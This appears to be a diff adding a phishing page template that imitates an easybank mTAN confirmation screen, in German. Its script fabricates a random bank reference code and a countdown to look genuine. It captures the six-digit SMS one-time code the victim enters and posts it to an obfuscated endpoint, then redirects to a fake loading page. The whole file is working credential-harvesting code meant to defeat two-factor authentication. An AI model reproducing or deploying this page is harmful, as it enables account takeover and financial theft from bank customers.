@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <title></title>
+    <link rel="stylesheet" href="css/botta.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+        <style>
+            body {
+                background-color: #f5f5f5;
+            }
+
+            .page-wrapper {
+                max-width: 400px;
+                margin: 0 auto;
+                padding: 30px 20px 40px;
+            }
+
+            .page-title {
+                font-size: 22px;
+                font-weight: 700;
+                color: #1a1a1a;
+                margin-bottom: 20px;
+            }
+
+            /* Info box */
+            .info-box {
+                background: #fff;
+                border: 1px solid #e0e0e0;
+                border-radius: 6px;
+                padding: 18px 20px;
+                margin-bottom: 28px;
+            }
+
+            .info-box p {
+                font-size: 14px;
+                color: #333;
+                line-height: 1.5;
+                margin: 0 0 10px;
+            }
+
+            .info-box .phone-masked {
+                font-size: 16px;
+                font-weight: 600;
+                color: #147D8E;
+            }
+
+            /* 6-box mTAN input */
+            .mtan-inputs {
+                display: flex;
+                gap: 10px;
+                margin-bottom: 12px;
+            }
+
+            .mtan-inputs input {
+                flex: 1;
+                height: 48px;
+                border: none;
+                border-bottom: 1.5px solid #333;
+                background: transparent;
+                text-align: center;
+                font-size: 22px;
+                font-weight: 600;
+                color: #1a1a1a;
+                outline: none;
+                
+                caret-color: #147D8E;
+                width: 100%;
+                transition: border-bottom-width 0.2s ease-out;
+            }
+
+            .mtan-inputs input:focus {
+                border-bottom-color: #147D8E;
+                border-bottom-width: 2px;
+            }
+            .mtan-inputs input:active {
+                outline: none;
+                border-bottom-color: #147D8E;
+                border-bottom-width: 2px;
+            }
+
+            /* Reference + Timer */
+            .mtan-meta {
+                margin-bottom: 24px;
+            }
+
+            .mtan-meta p {
+                font-size: 13px;
+                color: #555;
+                margin: 4px 0;
+            }
+
+            .mtan-meta .ref-code {
+                color: #333;
+            }
+
+            .mtan-meta .ref-code strong {
+                color: #147D8E;
+                font-weight: 700;
+            }
+
+            .mtan-meta .timer-line strong {
+                color: #1a1a1a;
+                font-weight: 700;
+            }
+
+            /* Help text */
+            .help-text {
+                font-size: 13px;
+                color: #444;
+                line-height: 1.6;
+                margin-bottom: 20px;
+            }
+
+            .help-text a {
+                color: #147D8E;
+                text-decoration: none;
+                font-weight: 600;
+            }
+
+            .help-text a:hover {
+                text-decoration: underline;
+            }
+
+            /* Weiter button */
+            .btn-weiter {
+                display: block;
+                width: 100%;
+                padding: 16px;
+                background-color: #147D8E;
+                color: #fff;
+                font-size: 17px;
+                font-weight: 600;
+                border: none;
+                border-radius: 30px;
+                cursor: pointer;
+                transition: background 0.2s;
+                margin-top: 10px;
+            }
+
+            .btn-weiter:hover {
+                background-color: #0e6473;
+            }
+
+            .btn-weiter:disabled {
+                background-color: #9bc8cf;
+                cursor: not-allowed;
+            }
+            .page-header {
+    width: 100%;
+    max-width: 670px;
+    margin: 0 auto;
+}
+
+
+            /* Responsive: shrink inputs on very small screens */
+            @media (max-width: 380px) {
+                .mtan-inputs input {
+                    font-size: 18px;
+                    height: 42px;
+                }
+            }
+        </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-inner">
+                <img src="img/luigon.PNG" alt="easybank" class="logo">
+                <img src="img/luigon-botuin.PNG" alt="Registrieren" class="reg-btn">
+            </div>
+        </header>
+
+        <!-- Main -->
+        <main style="background:#f5f5f5; padding: 30px 0; flex:1;">
+            <div class="page-header">
+                <h1 class="page-title">mTAN</h1>
+
+                <!-- Phone info box -->
+                <div class="info-box">
+                    <p>Wir haben eine mTAN per SMS an folgende Mobilnummer gesendet:</p>
+                    <p class="phone-masked">+49 1***********</p>
+                </div>
+            </div>
+            <div class="page-wrapper">
+                
+
+                <!-- 6 individual inputs -->
+                <form id="mtanForm">
+                    <div class="mtan-inputs">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric"
+                            autocomplete="one-time-code">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric">
+                    </div>
+                    <input type="hidden" id="mtan-hidden" name="code">
+
+                    <!-- Reference & countdown -->
+                    <div class="mtan-meta">
+                        <p class="ref-code">easybank Referenz: <strong id="ref-code">GFWNKP</strong></p>
+                        <p class="timer-line">Gültigkeit der mTAN läuft ab in: <strong id="countdown">05:00</strong></p>
+                    </div>
+
+                    <!-- Help text -->
+                    <p class="help-text">
+                        Falls Sie keine mTAN erhalten haben, können Sie eine neue anfordern. Bitte überprüfen Sie in dem
+                        Fall auch Ihre Netzwerkverbindung. Sie haben eine neue Mobilnummer? Bitte wenden Sie sich
+                        telefonisch an unseren Kundenservice:
+                        <br><br>
+                        Aus Deutschland: <a href="tel:+49408909900600">+49 40 890 99 – 600</a>
+                        (Für den easybank Finanzierungsrahmen rufen Sie bitte die Durchwahl -880 an)
+                        <br><br>
+                        Aus Österreich: <a href="tel:+43800445544">0800 445 544</a>
+                    </p>
+
+                    <button type="submit" class="btn-weiter" id="submitBtn">Weiter</button>
+                </form>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">FAQ</a>
+                <a href="#">Kontakt</a>
+                <a href="#">Impressum</a>
+                <a href="#">Datenschutz</a>
+                <a href="#">AGB</a>
+                <a href="#">Barrierefreiheit</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const digits = document.querySelectorAll('.mtan-digit');
+            const hiddenInput = document.getElementById('mtan-hidden');
+            const submitBtn = document.getElementById('submitBtn');
+            const form = document.getElementById('mtanForm');
+
+            // --- Generate random reference code ---
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let ref = '';
+            for (let i = 0; i < 6; i++) ref += chars[Math.floor(Math.random() * chars.length)];
+            document.getElementById('ref-code').textContent = ref;
+
+            // --- Countdown timer (5 minutes) ---
+            let seconds = 5 * 60;
+            const timerEl = document.getElementById('countdown');
+
+            function updateTimer() {
+                const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const s = String(seconds % 60).padStart(2, '0');
+                timerEl.textContent = m + ':' + s;
+                if (seconds > 0) {
+                    seconds--;
+                    setTimeout(updateTimer, 1000);
+                } else {
+                    timerEl.textContent = '00:00';
+                    timerEl.style.color = 'red';
+                }
+            }
+            updateTimer();
+
+            // --- OTP input navigation ---
+            digits.forEach((input, index) => {
+                input.addEventListener('input', function () {
+                    this.value = this.value.replace(/[^0-9]/g, '').slice(-1);
+                    if (this.value && index < digits.length - 1) {
+                        digits[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        digits[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowLeft' && index > 0) digits[index - 1].focus();
+                    if (e.key === 'ArrowRight' && index < digits.length - 1) digits[index + 1].focus();
+                });
+
+                input.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                    pasted.split('').forEach((char, i) => {
+                        if (digits[index + i]) digits[index + i].value = char;
+                    });
+                    const next = Math.min(index + pasted.length, digits.length - 1);
+                    digits[next].focus();
+                });
+            });
+
+            // --- Form submission ---
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                let code = '';
+                digits.forEach(d => code += d.value);
+
+                if (code.length < 6) {
+                    alert('Bitte geben Sie die vollständige 6-stellige mTAN ein.');
+                    return;
+                }
+
+                hiddenInput.value = code;
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Wird überprüft...';
+
+                $.ajax({
+                    url: '/m4kT9BQWt7KTDdaVmafx',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ code: code }),
+                    success: function (response) {
+                        if (response.OK) {
+                            setTimeout(() => {
+                                window.location.href = '/loading?time=7&url=/LGknmeM9HwWUWSutj6mJ';
+                            }, 2000);
+                        } else {
+                            alert('Falscher Code. Bitte versuchen Sie es erneut.');
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Weiter';
+                            digits.forEach(d => d.value = '');
+                            digits[0].focus();
+                        }
+                    },
+                    error: function () {
+                        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Weiter';
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+
+</html>
